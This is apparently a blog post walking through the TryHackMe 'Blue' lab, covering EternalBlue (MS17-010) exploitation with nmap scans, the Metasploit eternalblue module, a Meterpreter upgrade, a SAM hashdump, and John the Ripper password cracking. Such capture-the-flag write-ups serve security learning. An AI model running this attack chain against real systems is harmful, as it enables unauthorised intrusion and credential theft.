---
layout: ../../layouts/BlogLayout.astro
title: "BLUE THM write-up"
date: "MAR 20, 2026"
readTime: "8 MIN READ"
author: "Harsha"
category: "cyber"
---

# TryHackMe: Blue Walkthrough

## Introduction

**Blue** is a foundational, beginner-friendly room on TryHackMe that acts as a stark reminder of why legacy protocols should be deprecated. The target centers entirely around exploiting **EternalBlue** (CVE-2017-0143), a critical buffer overflow vulnerability in Microsoft's Server Message Block (SMBv1) protocol.

## The Attack Chain

Plaintext

```
Nmap Vulnerability Scan (Identify EternalBlue / MS17-010)
       ↓
Launch Metasploit (`exploit/windows/smb/ms17_010_eternalblue`)
       ↓
Gain Initial NT AUTHORITY\SYSTEM Access
       ↓
Upgrade Shell to Meterpreter Session
       ↓
Dump Hashes using Hashdump → Crack with John the Ripper
```

## Phase 1: Reconnaissance & Vulnerability Scanning

The assessment began with an initial infrastructure scan using `nmap` to map the system landscape and discover open services:

Bash

```
nmap -sV -sC -O -oN nmap_initial.txt <TARGET_IP>
```

The output confirmed standard Windows infrastructure services, highlighting **Port 445 (SMB)** as an open vector. Given the legacy nature of the OS hint, checking for known SMB flaws was the logical next step. Running Nmap's targeted MS17-010 script confirmed suspicions:

Bash

```
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
```

The script output returned a definitive `VULNERABLE` state, showing the host was susceptible to remote code execution.

## Phase 2: Exploitation & Initial Access

Because EternalBlue requires precise memory manipulation to succeed stably, the **Metasploit Framework** was used to manage the payload delivery.

Firing up `msfconsole`, the standard module was selected:

Bash

```
use exploit/windows/smb/ms17_010_eternalblue
```

The necessary configuration fields were filled out, pointing `RHOSTS` to the target machine and `LHOST` to the local TryHackMe VPN interface IP:

Bash

```
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
```

Running `exploit` sent the malformed SMBv1 packets down the wire. The kernel pool overflow triggered smoothly, catching an inbound connection and opening a high-privilege NT command shell. Because the exploit overrides a kernel service, there was no need to bypass standard user permissions; access was granted as **NT AUTHORITY\SYSTEM** instantly.

## Phase 3: Post-Exploitation & Credential Dumping

While a basic command shell is fine, upgrading to a **Meterpreter** session unlocks standard post-exploitation suites.

Backgrounding the shell (`Ctrl + Z`) allowed access to the post-management upgrade module:

Bash

```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
exploit
```

Dropping into the newly generated session (`sessions -i 2`) made it possible to interact with the local Security Account Manager (SAM) database. Running `hashdump` pulled the NT password signatures directly from memory:

Plaintext

```
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The NT hash segment for the local user (`ffb43f0de35be4d9917ac0cc8ad57f8d`) was isolated and saved into a local text file called `hash.txt`. From there, **John the Ripper** took care of the rest, comparing the signature against the standard `rockyou.txt` wordlist:

Bash

```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Within moments, the cryptographic signature was reversed, outputting the cleartext login password for the local user account.

- **All Flags Captured! Room Complete!**
